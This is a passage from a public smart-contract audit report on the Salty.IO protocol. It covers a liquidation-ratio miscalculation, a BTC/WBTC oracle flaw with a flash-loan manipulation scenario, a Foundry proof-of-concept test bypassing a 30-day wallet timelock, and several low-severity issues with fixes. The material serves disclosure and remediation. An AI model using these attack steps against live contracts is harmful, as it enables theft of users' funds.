**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/221#issuecomment-1945280386):**
 > minAddedAmountA and minAddedAmountB are now used.
> 
> Fixed in: https://github.com/othernet-global/salty-io/commit/0bb763cc67e6a30a97d8b157f7e5954692b3dd68

**[Picodes (Judge) decreased severity to Medium](https://github.com/code-423n4/2024-01-salty-findings/issues/221#issuecomment-1968656040)**

_Note: For full discussion, see [here](https://github.com/code-423n4/2024-01-salty-findings/issues/221)._

**Status:** Mitigation confirmed. Full details in reports from [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/89), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/110), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/56).

***

## [[M-29] Incorrect calculation to check remaining ratio after reward in StableConfig.sol](https://github.com/code-423n4/2024-01-salty-findings/issues/118)
*Submitted by [t0x1c](https://github.com/code-423n4/2024-01-salty-findings/issues/118), also found by [0xpiken](https://github.com/code-423n4/2024-01-salty-findings/issues/701), [klau5](https://github.com/code-423n4/2024-01-salty-findings/issues/151), and [haxatron](https://github.com/code-423n4/2024-01-salty-findings/issues/64)*

<https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/StableConfig.sol#L51-L54> 

><https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/StableConfig.sol#L127-L130>

[changeMinimumCollateralRatioPercent()](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/StableConfig.sol#L127-L130) allows the owner to change the `minimumCollateralRatioPercent` while the [changeRewardPercentForCallingLiquidation()](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/StableConfig.sol#L51-L54) function allows to change the `rewardPercentForCallingLiquidation`. <br>
The protocol aims to maintain a remaining ratio of `105%` as is evident by the comments in these 2 functions:

```js
// Don't decrease the minimumCollateralRatioPercent if the remainingRatio after the rewards would be less than 105% - to ensure that the position will be liquidatable for more than the originally borrowed USDS amount (assume reasonable market volatility)
```

and

```js
// Don't increase rewardPercentForCallingLiquidation if the remainingRatio after the rewards would be less than 105% - to ensure that the position will be liquidatable for more than the originally borrowed USDS amount (assume reasonable market volatility)
```

That is, if borrow amount is `100`, after the calls to any of these two functions, there should be at least `105` collateral remaining which will act as buffer against market volatility.<br>
The current calculation however is incorrect and there is really no direct relationship (*in the way the developer assumes*) between the `rewardPercentForCallingLiquidation` and `minimumCollateralRatioPercent`. Consider this:

*   `minimumCollateralRatioPercent` of 110% means that for a borrow amount of `200`, collateral should not go below `220`. This is 110% ***of 200***.
*   However, `rewardPercentForCallingLiquidation` of 5% is calculated on the ***collateral amount*** and NOT the borrowed amount as is evident in the comments too [here](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/StableConfig.sol#L18) and [here](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/CollateralAndLiquidity.sol#L156). So the liquidator will receive `5% of 220` (*let's assume boundary values for rounded calculations*) which is `11`.
*   The remaining amount would be `220 - 11 = 209` which is `104.5%` of the borrowed amount. This is less than the 105% the protocol was aiming for. In fact, this figure of `104.5%` goes down further to `103.5%` when `rewardPercentForCallingLiquidation = 5%` and `minimumCollateralRatioPercent = 115%` which is much lower than protocol's buffer target. Not being aware of this risk can cause unexpected loss of funds.

A table outlining the real buffer upper limit values is provided below. Another table showing the actual desirable gap in values is also provided so that the buffer always is above 105%. <br>

Straightaway, it can be seen that the current default protocol values of 5% and 110% give a buffer of less than 105% and hence either the `minimumCollateralRatioPercent` needs to have a lower limit of `111` instead of 110, or there should be agreement to the fact that `103.5%` is an acceptable `remainingRatio` figure under the current scheme of things.

### Proof of Concept

All figures expressed as ***% of borrowed amount*** i.e. `104.5` means `100` was borrowed. <br>

Current Implementation:

| rewardPercentForCallingLiquidation | minimumCollateralRatioPercent | ***Actual*** price fluctuation upper limit (instead of the expected 105%) |
| :--------------------------------: | :---------------------------: | :-----------------------------------------------------------------------: |
|                  5                 |              110              |                                   104.5                                   |
|                  6                 |              111              |                                   104.34                                  |
|                  7                 |              112              |                                   104.16                                  |
|                  8                 |              113              |                                   103.96                                  |
|                  9                 |              114              |                                   103.74                                  |
|                 10                 |              115              |                                   103.5                                   |

<br>

Desired figures for maintaining an upper limit of `>= 105%` of borrowed amount:

| rewardPercentForCallingLiquidation | ***Desired*** minimumCollateralRatioPercent | ***Resultant*** price fluctuation upper limit |
| :--------------------------------: | :-----------------------------------------: | :-------------------------------------------: |
|                  5                 |                     111                     |                     105.45                    |
|                  6                 |                     112                     |                     105.28                    |
|                  7                 |                     113                     |                     105.09                    |
|                  8                 |                     115                     |                     105.8                     |
|                  9                 |                     116                     |                     105.56                    |
|                 10                 |                     117                     |                     105.3                     |

### Recommended Mitigation Steps

Assuming that the protocol wants to calculate an actual 105% `remainingRatio`, changes along these lines need to be made. Please note that you may have to additionally make sure rounding errors & precision loss do not creep in. These suggestions point towards a general direction:<br>
Update the two functions:

```diff
	function changeRewardPercentForCallingLiquidation(bool increase) external onlyOwner
        {
        if (increase)
            {
			// Don't increase rewardPercentForCallingLiquidation if the remainingRatio after the rewards would be less than 105% - to ensure that the position will be liquidatable for more than the originally borrowed USDS amount (assume reasonable market volatility)
+           uint256 afterIncrease = rewardPercentForCallingLiquidation + 1;
+           uint256 remainingRatio = minimumCollateralRatioPercent - minimumCollateralRatioPercent * afterIncrease / 100;
-			uint256 remainingRatioAfterReward = minimumCollateralRatioPercent - rewardPercentForCallingLiquidation - 1;

-           if (remainingRatioAfterReward >= 105 && rewardPercentForCallingLiquidation < 10)
+           if (remainingRatio >= 105 && rewardPercentForCallingLiquidation < 10)
                rewardPercentForCallingLiquidation += 1;
            }
        else
            {
            if (rewardPercentForCallingLiquidation > 5)
                rewardPercentForCallingLiquidation -= 1;
            }

		emit RewardPercentForCallingLiquidationChanged(rewardPercentForCallingLiquidation);
        }
```

and

```diff
	function changeMinimumCollateralRatioPercent(bool increase) external onlyOwner
        {
        if (increase)
            {
            if (minimumCollateralRatioPercent < 120)
                minimumCollateralRatioPercent += 1;
            }
        else
            {
			// Don't decrease the minimumCollateralRatioPercent if the remainingRatio after the rewards would be less than 105% - to ensure that the position will be liquidatable for more than the originally borrowed USDS amount (assume reasonable market volatility)
+           uint256 afterDecrease = minimumCollateralRatioPercent - 1;
+           uint256 remainingRatio = afterDecrease - afterDecrease * rewardPercentForCallingLiquidation / 100;            
-			uint256 remainingRatioAfterReward = minimumCollateralRatioPercent - 1 - rewardPercentForCallingLiquidation;

-           if (remainingRatioAfterReward >= 105 && minimumCollateralRatioPercent > 110)
+           if (remainingRatio >= 105 && minimumCollateralRatioPercent > 111)
                minimumCollateralRatioPercent -= 1;
            }

		emit MinimumCollateralRatioPercentChanged(minimumCollateralRatioPercent);
        }
```

Also [L39](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/StableConfig.sol#L39):

```diff
- 39:     uint256 public minimumCollateralRatioPercent = 110;
+ 39:     uint256 public minimumCollateralRatioPercent = 111;
```

**[Picodes (Judge) commented](https://github.com/code-423n4/2024-01-salty-findings/issues/118#issuecomment-1956884139):**
 > This report shows how an invariant of the protocol is broken so Medium severity seems appropriate.

**[othernet-global (Salty.IO) acknowledged and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/118#issuecomment-1960691761):**
 > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:

> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9

**Status:** Mitigation confirmed. Full details in reports from [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/111), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/90), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/26).

***

## [[M-30] Chainlink price feed uses BTC, not WBTC. In case of depegging, oracles will become easier to manipulate](https://github.com/code-423n4/2024-01-salty-findings/issues/60)
*Submitted by [thekmj](https://github.com/code-423n4/2024-01-salty-findings/issues/60), also found by [peanuts](https://github.com/code-423n4/2024-01-salty-findings/issues/1061), [Tripathi](https://github.com/code-423n4/2024-01-salty-findings/issues/997), [Ward](https://github.com/code-423n4/2024-01-salty-findings/issues/942), [OMEN](https://github.com/code-423n4/2024-01-salty-findings/issues/930), [Toshii](https://github.com/code-423n4/2024-01-salty-findings/issues/888), [J4X](https://github.com/code-423n4/2024-01-salty-findings/issues/787), [grearlake](https://github.com/code-423n4/2024-01-salty-findings/issues/777), [00xSEV](https://github.com/code-423n4/2024-01-salty-findings/issues/646), [juancito](https://github.com/code-423n4/2024-01-salty-findings/issues/632), [Lalanda](https://github.com/code-423n4/2024-01-salty-findings/issues/272), and [eeshenggoh](https://github.com/code-423n4/2024-01-salty-findings/issues/4)*

<https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreChainlinkFeed.sol#L15> 

<https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreSaltyFeed.sol#L32-L41> 

<https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/PriceAggregator.sol#L108>

Chainlink BTC price feed is BTC/USD, not WBTC/USD. In the event of WBTC depegging, the oracle's return price will deviate from its actual value. We also provide a real-life WBTC depegging event as evidence.

This alone is not enough for the price aggregator to return the incorrect price, as an adversary needs to manipulate two of three price feeds to manipulate the price. However, due to the aggregator design, we also make an argument that in case of actual depegging, the price will indeed be easier to manipulate.

### Vulnerability details

According to the [official Chainlink docs](https://docs.chain.link/data-feeds/price-feeds/addresses?network=ethereum\&page=1\&search=btc), there are four price feeds for BTC on Ethereum Mainnet:

*   BTC / ETH
*   BTC / USD
*   ETH / BTC
*   WBTC / BTC

Based on the following observations, we believe Salty will use BTC/USD on the Chainlink price feed, instead of WBTC:

*   All test cases use BTC/USD feed, and nowhere in the code repo is the WBTC feed used.
*   There is no WBTC/USD feed on Ethereum Mainnet (they are available on some other networks).
*   Salty's Chainlink price fetcher uses only one feed for the WBTC price. At least two feeds are needed (WBTC/BTC and BTC/USD) to fetch the WBTC/USD price.

[Historically, WBTC has depegged down to 0.98 before](https://thedefiant.io/wbtc-depeg), in the event of wild market swing, specifically during the LUNA crash.

*   Even as of time of report writing, the Chainlink feed for WBTC/BTC does not return a price of 1. [Screenshot](https://imgur.com/UBYlhFH).

[This article](https://thebitcoinmanual.com/articles/why-wrapped-bitcoin-depeg/) explains some of the reasons of why WBTC can depeg.

**Full oracle manipulation (PoC)**

This alone is not enough to manipulate the oracle entirely, as Salty uses a triple-oracle setting, consisting of Uniswap V3 TWAP, Chainlink price, and Salty pool spot price:

*   Out of the three prices, the oracle selects the two price with the lower absolute difference.
*   If the two chosen prices are too different, returns 0 signalling failure. Otherwise, return the average of the chosen prices.

However, if the Chainlink price has already deviates, then an adversary will only have to manipulate one more oracle to manipulate the price feed.

The weaker Oracle out of the remaining two is the Salty WBTC pool spot price. Assuming WBTC has already depegged, an adversary can perform the following attack to gain profit:

*   Flash loan a large amount of WBTC from anywhere.
*   Perform a swap on the WBTC Salty pool, skewing its spot price to be closer to the Chainlink (wrong) price feed.
*   The aggregated price now reflects the BTC/USD price, instead of WBTC/USD.
*   With a deviated price, there is a lot that the attacker can do for free:
    *   Liquidate positions that is actually not yet underwater, and take profit.
*   Return the flash loan amount.

An attacker can also take an undercollateralized position. However, this is more difficult to profit from, as it also requires rapid market swing and the lack of liquation before the position becomes insolvent. This also requires that an attacker has large enough capital.

*   Given the scenario where the de-peg has already occured, then this becomes more realistic.

### Impact

In the event of WBTC/BTC depeg, such as rapid market swing, the price oracle will become easier to manipulate.

*   Given the price of BTC, even a 2% deviation can be considered large.

### Recommended mitigation steps

Collect the WBTC price from two Chainlink price feeds, the BTC/USD feed and the WBTC/BTC feed, as the source of truth.

**[othernet-global (Salty.IO) acknowledged and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/60#issuecomment-1960685173):**

 > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:

> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9

**Status:** Mitigation confirmed. Full details in reports from [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/91), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/112), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/27).

***

## [[M-31] changeWallets() can be confirmed immediately after proposalWallets() by manipulating activeTimelock beforehand](https://github.com/code-423n4/2024-01-salty-findings/issues/49)
*Submitted by [t0x1c](https://github.com/code-423n4/2024-01-salty-findings/issues/49), also found by [ether\_sky](https://github.com/code-423n4/2024-01-salty-findings/issues/1052), [peanuts](https://github.com/code-423n4/2024-01-salty-findings/issues/1050), [oakcobalt](https://github.com/code-423n4/2024-01-salty-findings/issues/1006), [IceBear](https://github.com/code-423n4/2024-01-salty-findings/issues/862), [wangxx2026](https://github.com/code-423n4/2024-01-salty-findings/issues/698), [0xpiken](https://github.com/code-423n4/2024-01-salty-findings/issues/664), and [0xCiphky](https://github.com/code-423n4/2024-01-salty-findings/issues/637)*

`ManagedWallet.sol` [states](https://github.com/code-423n4/2024-01-salty/blob/main/src/ManagedWallet.sol#L7-L10) that:

```text
// A smart contract which provides two wallet addresses (a main and confirmation wallet) which can be changed using the following mechanism:
// 1. Main wallet can propose a new main wallet and confirmation wallet.
// 2. Confirmation wallet confirms or rejects.
// 3. There is a timelock of 30 days before the proposed mainWallet can confirm the change.
```
However, the current 30-day wait period can be bypassed. <br>

The expected order by the protocol is:

1.  `proposeWallets()` is called by `mainWallet`.
2.  To confirm the proposal, `confirmationWallet` sends at least 0.05 ether and causes the `receive()` function to trigger. This sets the `activeTimelock` to `block.timestamp + TIMELOCK_DURATION` i.e. 30 days into the future.
3.  `proposedMainWallet` calls `changeWallets()` after 30 days and the new wallet addresses are set.

To bypass the 30-day limitation, the following flow can be used:

1.  Even with no propsal for a change existing, `confirmationWallet` sends at least 0.05 ether and causes the `receive()` function to trigger. This sets the `activeTimelock` to `block.timestamp + TIMELOCK_DURATION` i.e. 30 days into the future.
2.  Just as 30 days pass,
    *   `proposeWallets()` is called by `mainWallet`
    *   Immediately, with no delay whatsoever, `proposedMainWallet` calls `changeWallets()`
3.  The new wallet addresses are successfully assigned.

**Impact:** Although the users believe that any changes to wallet address is going to have a timelock of 30 days as promised by the protocol, it really can be bypassed by the current admins/wallet addresses. This breaks the intended functionality implmentation.

### Proof of Concept

Add the following inside `2024-01-salty/src/root_tests/ManagedWallet.t.sol` and run with `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.sepolia.org/ --mt test_ManipulateActiveTimeLockBeforeProposingNewWallets`:

<details>

```js
    function test_ManipulateActiveTimeLockBeforeProposingNewWallets() public {
        // Set up the initial state with main and confirmation wallets
        address initialMainWallet = alice;
        address initialConfirmationWallet = address(0x2222);
        ManagedWallet managedWallet = new ManagedWallet(initialMainWallet, initialConfirmationWallet);

        // Set up the proposed main and confirmation wallets
        address newMainWallet = address(0x3333);
        address newConfirmationWallet = address(0x4444);

        // @audit : Even before any proposal exists, prank as the current confirmation wallet and send ether to start the TIMELOCK_DURATION 
        uint256 sentValue = 0.06 ether;
        vm.prank(initialConfirmationWallet);
        vm.deal(initialConfirmationWallet, sentValue);
        (bool success,) = address(managedWallet).call{value: sentValue}("");
        assertTrue(success, "Confirmation of wallet proposal failed");

        // Warp the blockchain time to the future beyond the active timelock period
        uint256 currentTime = block.timestamp;
        vm.warp(currentTime + TIMELOCK_DURATION);

        // Prank as the initial main wallet to propose the new wallets
        vm.startPrank(initialMainWallet);
        managedWallet.proposeWallets(newMainWallet, newConfirmationWallet);
        vm.stopPrank();

        // @audit : With NO DELAY, immediately prank as the new proposed main wallet which should now be allowed to call changeWallets
        vm.prank(newMainWallet);
        managedWallet.changeWallets();

        // Check that the mainWallet and confirmationWallet state variables are updated
        assertEq(managedWallet.mainWallet(), newMainWallet, "mainWallet was not updated correctly");
        assertEq(managedWallet.confirmationWallet(), newConfirmationWallet, "confirmationWallet was not updated correctly");

        // Check that the proposed wallets and activeTimelock have been reset
        assertEq(managedWallet.proposedMainWallet(), address(0), "proposedMainWallet was not reset");
        assertEq(managedWallet.proposedConfirmationWallet(), address(0), "proposedConfirmationWallet was not reset");
        assertEq(managedWallet.activeTimelock(), type(uint256).max, "activeTimelock was not reset to max uint256");
    }
```

</details>

### Tools used

Foundry

### Recommended Mitigation Steps

Inside `receive()` make sure an active proposal exists:

```diff
    receive() external payable
    	{
    	require( msg.sender == confirmationWallet, "Invalid sender" );
+       require( proposedMainWallet != address(0), "Cannot manipulate activeTimelock without active proposal" );

		// Confirm if .05 or more ether is sent and otherwise reject.
		// Done this way in case custodial wallets are used as the confirmationWallet - which sometimes won't allow for smart contract calls.
    	if ( msg.value >= .05 ether )
    		activeTimelock = block.timestamp + TIMELOCK_DURATION; // establish the timelock
    	else
			activeTimelock = type(uint256).max; // effectively never
        }
```

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/49#issuecomment-1953430147):**
 > Managed wallet has been removed:
> 
> https://github.com/othernet-global/salty-io/commit/5766592880737a5e682bb694a3a79e12926d48a5

**Status:** Mitigation confirmed. Full details in reports from [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/15), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/113), and [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/92).

***

# Low Risk and Non-Critical Issues

For this audit, 57 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-01-salty-findings/issues/638) by **juancito** received the top score from the judge.

*The following wardens also submitted reports: [oakcobalt](https://github.com/code-423n4/2024-01-salty-findings/issues/918), [J4X](https://github.com/code-423n4/2024-01-salty-findings/issues/913), [peanuts](https://github.com/code-423n4/2024-01-salty-findings/issues/907), [7ashraf](https://github.com/code-423n4/2024-01-salty-findings/issues/852), [niroh](https://github.com/code-423n4/2024-01-salty-findings/issues/793), [ether\_sky](https://github.com/code-423n4/2024-01-salty-findings/issues/762), [0xCiphky](https://github.com/code-423n4/2024-01-salty-findings/issues/729), [t0x1c](https://github.com/code-423n4/2024-01-salty-findings/issues/599), [Jorgect](https://github.com/code-423n4/2024-01-salty-findings/issues/588), [0xbepresent](https://github.com/code-423n4/2024-01-salty-findings/issues/559), [0xBinChook](https://github.com/code-423n4/2024-01-salty-findings/issues/524), [Topmark](https://github.com/code-423n4/2024-01-salty-findings/issues/445), [lsaudit](https://github.com/code-423n4/2024-01-salty-findings/issues/400), [Bauchibred](https://github.com/code-423n4/2024-01-salty-findings/issues/379), [0xSmartContractSamurai](https://github.com/code-423n4/2024-01-salty-findings/issues/147), [Tripathi](https://github.com/code-423n4/2024-01-salty-findings/issues/1028), [0xMango](https://github.com/code-423n4/2024-01-salty-findings/issues/1025), [vnavascues](https://github.com/code-423n4/2024-01-salty-findings/issues/1014), [Arz](https://github.com/code-423n4/2024-01-salty-findings/issues/1001), [grearlake](https://github.com/code-423n4/2024-01-salty-findings/issues/978), [Audinarey](https://github.com/code-423n4/2024-01-salty-findings/issues/975), [Udsen](https://github.com/code-423n4/2024-01-salty-findings/issues/970), [slvDev](https://github.com/code-423n4/2024-01-salty-findings/issues/967), [pina](https://github.com/code-423n4/2024-01-salty-findings/issues/947), [lanrebayode77](https://github.com/code-423n4/2024-01-salty-findings/issues/939), [inzinko](https://github.com/code-423n4/2024-01-salty-findings/issues/934), [sivanesh\_808](https://github.com/code-423n4/2024-01-salty-findings/issues/917), [KingNFT](https://github.com/code-423n4/2024-01-salty-findings/issues/908), [jasonxiale](https://github.com/code-423n4/2024-01-salty-findings/issues/878), [josephdara](https://github.com/code-423n4/2024-01-salty-findings/issues/872), [IceBear](https://github.com/code-423n4/2024-01-salty-findings/issues/863), [csanuragjain](https://github.com/code-423n4/2024-01-salty-findings/issues/778), [The-Seraphs](https://github.com/code-423n4/2024-01-salty-findings/issues/774), [0x3b](https://github.com/code-423n4/2024-01-salty-findings/issues/764), [Draiakoo](https://github.com/code-423n4/2024-01-salty-findings/issues/711), [0xpiken](https://github.com/code-423n4/2024-01-salty-findings/issues/708), [wangxx2026](https://github.com/code-423n4/2024-01-salty-findings/issues/688), [0xRobocop](https://github.com/code-423n4/2024-01-salty-findings/issues/653), [dharma09](https://github.com/code-423n4/2024-01-salty-findings/issues/587), [Rolezn](https://github.com/code-423n4/2024-01-salty-findings/issues/572), [ZanyBonzy](https://github.com/code-423n4/2024-01-salty-findings/issues/544), [a3yip6](https://github.com/code-423n4/2024-01-salty-findings/issues/453), [chaduke](https://github.com/code-423n4/2024-01-salty-findings/issues/440), [codeslide](https://github.com/code-423n4/2024-01-salty-findings/issues/439), [0xHelium](https://github.com/code-423n4/2024-01-salty-findings/issues/418), [b0g0](https://github.com/code-423n4/2024-01-salty-findings/issues/328), [Banditx0x](https://github.com/code-423n4/2024-01-salty-findings/issues/281), [djxploit](https://github.com/code-423n4/2024-01-salty-findings/issues/227), [0xOmer](https://github.com/code-423n4/2024-01-salty-findings/issues/218), [Rhaydden](https://github.com/code-423n4/2024-01-salty-findings/issues/209), [Kaysoft](https://github.com/code-423n4/2024-01-salty-findings/issues/179), [eta](https://github.com/code-423n4/2024-01-salty-findings/issues/89), [linmiaomiao](https://github.com/code-423n4/2024-01-salty-findings/issues/68), [jesjupyter](https://github.com/code-423n4/2024-01-salty-findings/issues/62), [0xWaitress](https://github.com/code-423n4/2024-01-salty-findings/issues/58), and [Tigerfrake](https://github.com/code-423n4/2024-01-salty-findings/issues/8).*

## Low Severity Findings

## [L-01] - `callContract` proposals are created with no `description`

### Impact

`callContract` proposals will be created with no `description`. The `Proposal` contract will be bricked, as it can't be fixed on-chain. Off-chain tools and integrations will have to create special code to lead with this error. Integrating contracts will have to take this error into account as well.

### Vulnerability Details

Note how `description` is placed on the `string1` parameter of [_possiblyCreateProposal](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L81) for `callContract` proposals. `string2` is actually used for the `description`, so its actual value here will be `""`.

```solidity
    // Proposes calling the callFromDAO(uint256) function on an arbitrary contract.
    function proposeCallContract( address contractAddress, uint256 number, string calldata description ) external nonReentrant returns (uint256 ballotID) {
        require( contractAddress != address(0), "Contract address cannot be address(0)" );

        string memory ballotName = string.concat("callContract:", Strings.toHexString(address(contractAddress)) );
👉      return _possiblyCreateProposal( ballotName, BallotType.CALL_CONTRACT, contractAddress, number, description, "" );
    }
```

`string1` is used for calling attributes everywhere else, and `string2` is used instead for the `description`, like in [createConfirmationProposal()](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L126), [`proposeParameterBallot()`](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L158), [`proposeTokenWhitelisting()`](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L173) just to name a few, but it holds for all proposals.

### Recommended Mitigation Steps

Fix the code like this:

```diff
    // Proposes calling the callFromDAO(uint256) function on an arbitrary contract.
    function proposeCallContract( address contractAddress, uint256 number, string calldata description ) external nonReentrant returns (uint256 ballotID) {
        require( contractAddress != address(0), "Contract address cannot be address(0)" );

        string memory ballotName = string.concat("callContract:", Strings.toHexString(address(contractAddress)) );
-       return _possiblyCreateProposal( ballotName, BallotType.CALL_CONTRACT, contractAddress, number, description, "" );
+       return _possiblyCreateProposal( ballotName, BallotType.CALL_CONTRACT, contractAddress, number, "", description );
    }
```

## [L-02] - `withdrawArbitrageProfits()` will revert when `depositedWETH <= PoolUtils.DUST`

`withdrawArbitrageProfits()` will revert when attempting [to withdraw](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L304) less than the dust amount, [because of a check on the pool](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/Pools.sol#L222).

This is called [in step 2 of the Upkeep](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/Upkeep.sol#L114).

### Recommendation

Safely return when the `depositedWETH` is less than the pools dust:

```diff
    // The arbitrage profits are deposited in the Pools contract as WETH and owned by the DAO.
    uint256 depositedWETH = pools.depositedUserBalance(address(this), weth );
-   if ( depositedWETH == 0 )
+   if ( depositedWETH <= PoolUtils.DUST )
        return 0;

    pools.withdraw( weth, depositedWETH );
```

## [L-03] - `string1` and `string2` length is not validated when creating proposals

[In `_possiblyCreateProposal()`](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L81) `string1` length is not validated for `tokenIconURL` or `newWebsiteURL`. `string2` is not validated for the proposal `description`.

Very large strings will make proposals difficult to read for voters.

### Recommendation

Set a limit to the length of the strings

## [L-04] - It is possible to create proposals that can't be finalized

Certain attributes make passing proposal impossible to be finalized, as they will revert. This also bricks the ability of the proposer to ever propose another ballot again, and prevents other users from creating a new ballot with the same name.

Affected proposals:

- `proposeParameterBallot()` allows to [set any `parameterType`](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L158), but it can revert when trying to [convert it to `ParameterTypes`](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L120), if the number is ot of bounds [for the `ParameterTypes`](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Parameters.sol#L14-L53) enum.

### Recommendation

Verify the range of the attributes on proposal creation.

## [L-05] - `tokenWhitelistingBallotWithTheMostVotes()` returns the ballot id `0` when no proposal reaches quorum

[If no proposal votes reaches quorum](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L429), then the function will [returns its default value, which is `0`](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L421).

### Recommendation

Revert when the returned value is `0`. It is safe, as [`ballotId` starts at 1](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L108), and when the function is used to [finalize whitelisted tokens](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L250), the ballot already needs to reach quorum to get to this point.

## [L-06] - `websiteURL` should be set in the constructor

The `websiteURL` [is set on the DAO](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L150) only [after a ballot voting passes](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L214). The initial setup will take many days, from airdrop, to staking, to proposing, to voting, leaving the DAO contract with no initial website URL during that period.

### Recommendation

Set an initial value for `websiteURL` in the `DAO` `constructor`.

## [L-07] - Votes can't be delegated

The protocol is missing some function to delegate votes to other users.

This is important as not all users will participate in DAO voting (as there is no direct incentive), and those votes could be delegated to other users they trust and will be actively participating in the DAO. 

This makes it easier to reach quorum, to prevent malicious proposals from passing, and incentivizes participation of dedicated users in the DAO.

## [L-08] - Signatures do not implement EIP-712

### Impact

[EIP-712 Motivation](https://eips.ethereum.org/EIPS/eip-712#motivation) is to improve the usability of off-chain message signing for use on-chain.

By not adhering to it, users will find more difficulty understanding what they are signing, as off-chain tools will have trouble decoding the messsage, leading to a compatibility and integration issue.

Signatures can also be replayed on other contracts, as the contract address is not included in the message hash.

### Proof of Concept

Message hashes are implemented without following specs by EIP-712, missing the [`typeHash`](https://eips.ethereum.org/EIPS/eip-712#rationale-for-typehash), and the [`domainSeparator`](https://eips.ethereum.org/EIPS/eip-712#definition-of-domainseparator).

```solidity
bytes32 messageHash = keccak256(abi.encodePacked(block.chainid, geoVersion, wallet));
return SigningTools._verifySignature(messageHash, signature);
```

[AccessManager.sol#L53](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/AccessManager.sol#L53)

```solidity
bytes32 messageHash = keccak256(abi.encodePacked(block.chainid, msg.sender));
require(SigningTools._verifySignature(messageHash, signature), "Incorrect BootstrapBallot.vote signatory" );
```

[BootstrapBallot.sol#L53-L54](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/launch/BootstrapBallot.sol#L53-L54)

### Recommendation

Follow the EIP-712 spec, including the corresponding `typeHash`, `domainSeparator`, contract address, and build the message hash accordingly.

## [L-09] - DUST value too big for tokens with low decimals

Some tokens with a considerable market cap like [GUSD](https://coinmarketcap.com/currencies/gemini-dollar/), or [EURS](https://coinmarketcap.com/currencies/stasis-euro/) have 2 decimals.

The [`DUST`](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/PoolUtils.sol#L13) value is fixed at `100`, which can be considerable big as dust, since it is used all over the protocol, with many `require` depending on the amount being bigger than it.

### Recommendation

Consider defining dust values considering proportional to the decimals of the tokens

## [L-10] - Arbitrage profit is not calculated correctly when there is an index with an `INVALID_POOL_ID`

### Impact

